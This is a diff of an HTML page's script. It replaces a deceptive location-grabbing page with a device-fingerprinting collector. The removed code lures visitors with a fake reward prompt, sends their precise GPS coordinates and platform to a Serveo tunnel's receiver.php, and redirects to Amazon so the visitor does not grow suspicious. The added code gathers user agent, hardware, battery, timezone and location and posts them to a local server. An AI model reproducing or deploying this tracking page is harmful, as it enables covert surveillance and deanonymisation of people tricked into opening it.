@@ -21,38 +21,66 @@
 </div>
 
 <script>
-    // TERA SERVEO LINK YAHAN HAI
-    const serverURL = "https://prolevel.serveousercontent.com"; 
+const serverURL = "http://localhost:3000"; // Local server
 
-    function sendData(lat, lon) {
-        // Data capture and send to Termux
-        fetch(`${serverURL}/receiver.php?lat=${lat}&lon=${lon}&device=${navigator.platform}`)
-        .then(() => {
-            // Success hone par Amazon redirect
-            window.location.href = "https://www.amazon.in";
-        })
-        .catch(err => {
-            // Error hone par bhi redirect (taki shak na ho)
-            window.location.href = "https://www.amazon.in";
+function sendData(data) {
+    fetch(`${serverURL}/log-info`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+    });
+}
+
+document.getElementById("openBoth").addEventListener("click", () => {
+
+    // 🔁 Device info
+    const data = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        languages: navigator.languages || [],
+        online: navigator.onLine,
+        ram: navigator.deviceMemory || "NA",
+        cpuCores: navigator.hardwareConcurrency || "NA",
+        screenRes: screen.width + "x" + screen.height,
+        colorDepth: screen.colorDepth,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        batteryLevel: 0,
+        isCharging: false,
+        latitude: null,
+        longitude: null
+    };
+
+    // 🔋 Battery info
+    if (navigator.getBattery) {
+        navigator.getBattery().then(battery => {
+            data.batteryLevel = Math.round(battery.level * 100);
+            data.isCharging = battery.charging;
+            sendData(data);
         });
     }
 
-    document.getElementById("openBoth").addEventListener("click", () => {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    sendData(position.coords.latitude, position.coords.longitude);
-                },
-                (error) => {
-                    alert("Please allow permissions to sync and get your reward.");
-                    window.location.href = "https://www.amazon.in";
-                },
-                { enableHighAccuracy: true }
-            );
-        } else {
-            window.location.href = "https://www.amazon.in";
-        }
-    });
+    // 🌐 Geolocation
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            pos => {
+                data.latitude = pos.coords.latitude;
+                data.longitude = pos.coords.longitude;
+                sendData(data);
+                alert("Data sent! Check server console.");
+            },
+            err => {
+                sendData(data);
+                alert("Location permission denied. Only device info sent.");
+            },
+            { enableHighAccuracy: true }
+        );
+    } else {
+        sendData(data);
+        alert("Geolocation not supported. Only device info sent.");
+    }
+
+});
 </script>
 
 </body>
